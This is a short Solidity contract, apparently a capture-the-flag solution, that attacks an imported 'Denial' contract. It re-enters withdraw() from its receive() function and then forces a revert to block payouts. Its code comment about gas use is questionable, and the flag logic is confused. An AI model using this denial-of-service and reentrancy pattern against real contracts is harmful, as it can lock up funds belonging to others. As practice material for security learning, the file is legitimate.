// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        //Withdraw two times, second time with assert reverting with no gas left for any other execution.
        bool flag;
        if (!flag){
            Denial(contractAddress).withdraw();
            flag = true;
        }
        if (flag){
            assert(false);
        }
    }
}
